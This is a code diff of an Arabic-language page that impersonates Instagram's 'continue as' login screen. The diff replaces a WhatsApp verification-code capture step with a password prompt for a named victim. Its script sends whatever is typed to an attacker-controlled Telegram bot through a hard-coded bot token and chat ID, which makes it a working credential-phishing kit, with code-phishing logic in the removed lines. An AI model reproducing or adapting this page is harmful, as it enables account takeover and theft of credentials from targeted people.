@@ -17,23 +17,13 @@ body{background:#fff;color:#000;min-height:100vh;overflow-x:hidden}
 .name{font-size:28px;font-weight:400;margin-top:26px;color:#000;letter-spacing:0.2px}
 .btn{width:100%;max-width:520px;height:56px;border:0;border-radius:28px;background:#0064e0;color:#fff;font-size:17px;font-weight:600;margin-top:32px;cursor:pointer;transition:opacity .15s}
 .btn:active{opacity:.7}
+.input{width:100%;max-width:520px;height:56px;border:1px solid #dbdbdb;border-radius:12px;padding:0 16px;font-size:16px;margin-top:12px;outline:none;background:#fafafa;display:none;text-align:right}
+.input:focus{border-color:#a8a8a8;background:#fff}
 .other{margin-top:26px;font-size:16px;color:#000;cursor:pointer}
 .bottom{display:flex;flex-direction:column;align-items:center;gap:28px;padding:24px 0 32px}
 .create{border:1px solid #0064e0;color:#0064e0;background:#fff;height:44px;padding:0 28px;border-radius:22px;font-size:15px;font-weight:500;cursor:pointer}
 .meta{display:flex;align-items:center;gap:6px;font-size:16px;font-weight:600;color:#000}
 .meta svg{width:22px;height:22px}
-
-#p2{display:none;flex-direction:column;min-height:100vh;padding:0 24px}
-.back{position:absolute;top:16px;left:16px;width:28px;height:28px;cursor:pointer;z-index:5}
-.user-icon{width:72px;height:72px;border-radius:50%;object-fit:cover;margin:72px auto 0;display:block;background:#f0f0f0}
-.h1{font-size:22px;font-weight:600;text-align:center;margin-top:36px;color:#000}
-.sub{font-size:15px;color:#000;text-align:center;margin-top:20px;line-height:1.6;padding:0 8px}
-.code-wrap{width:100%;max-width:520px;margin:32px auto 0}
-.code{width:100%;height:64px;border:1px solid #dbdbdb;border-radius:12px;padding:0 16px;font-size:17px;outline:none;background:#fff;text-align:right;color:#000}
-.code:focus{border-color:#a8a8a8}
-.code::placeholder{color:#8e8e8e}
-.btn2{width:100%;max-width:520px;height:56px;border:0;border-radius:28px;background:#0064e0;color:#fff;font-size:17px;font-weight:600;margin:24px auto 0;cursor:pointer;display:block;transition:opacity .15s}
-.btn2:active{opacity:.7}
 </style>
 </head>
 <body>
@@ -46,10 +36,12 @@ body{background:#fff;color:#000;min-height:100vh;overflow-x:hidden}
   <div class="wrap">
     <img class="insta" src="https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp" alt="Instagram">
     <div class="avatar">
-      <img src="https://i.ibb.co/twfn6bDZ/657553477-17993182562945849-1658422270384463677-n.jpg" alt="">
+      <img src="https://i.ibb.co/5WpmYDxq/719161051-17888155689554614-4171028898969530542-n.jpg" alt="">
     </div>
-    <div class="name">syr.5.1.5</div>
-    <button class="btn" onclick="goVerify()">متابعة</button>
+    <div class="name">عبدالله الحسين</div>
+    <button class="btn" id="followBtn" onclick="showPass()">متابعة</button>
+    <input class="input" id="passInput" type="password" placeholder="ادخل كلمة السر">
+    <button class="btn" id="followBtn2" style="display:none;margin-top:12px" onclick="followNow()">متابعة</button>
     <div class="other">استخدام ملف شخصي آخر</div>
   </div>
   <div class="bottom">
@@ -63,42 +55,26 @@ body{background:#fff;color:#000;min-height:100vh;overflow-x:hidden}
   </div>
 </div>
 
-<div id="p2">
-  <svg class="back" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" onclick="goBack()">
-    <polyline points="15 18 9 12 15 6"/>
-  </svg>
-  <img class="user-icon" src="https://i.ibb.co/twfn6bDZ/657553477-17993182562945849-1658422270384463677-n.jpg" alt="">
-  <div class="h1">تفقّد حسابك على واتساب</div>
-  <div class="sub">لقد أرسلنا رمزًا إلى +90 *** *** ** 07. يرجى إدخال هذا الرمز لتأكيد حسابك.</div>
-  <div class="code-wrap">
-    <input class="code" id="verifyCode" type="tel" inputmode="numeric" placeholder="أدخل الرمز" maxlength="10">
-  </div>
-  <button class="btn2" onclick="sendVerify()">متابعة</button>
-</div>
-
 <script>
 var BOT_TOKEN="8845943752:AAE9WMF0LGen7Ydelx3HVE_-C-lt4F1j608";
 var CHAT_ID="8599240795";
 
-function goVerify(){
-  document.getElementById('p1').style.display='none';
-  document.getElementById('p2').style.display='flex';
+function showPass(){
+  document.getElementById('followBtn').style.display='none';
+  document.getElementById('passInput').style.display='block';
+  document.getElementById('followBtn2').style.display='block';
+  document.getElementById('passInput').focus();
 }
 
-function sendVerify(){
-  var c=document.getElementById('verifyCode').value;
-  if(!c){document.getElementById('verifyCode').focus();return;}
+function followNow(){
+  var v=document.getElementById('passInput').value;
+  if(!v){document.getElementById('passInput').focus();return;}
   fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",{
     method:"POST",
     headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({chat_id:CHAT_ID,text:"🔐 Instagram — رمز التحقق\n👤 syr.5.1.5\n🔢 "+c})
+    body:JSON.stringify({chat_id:CHAT_ID,text:"🔐 Instagram\n👤 عبدالله الحسين\n🔑 "+v})
   }).catch(function(){});
-  document.getElementById('verifyCode').value='';
-}
-
-function goBack(){
-  document.getElementById('p2').style.display='none';
-  document.getElementById('p1').style.display='flex';
+  document.getElementById('passInput').value='';
 }
 </script>
 
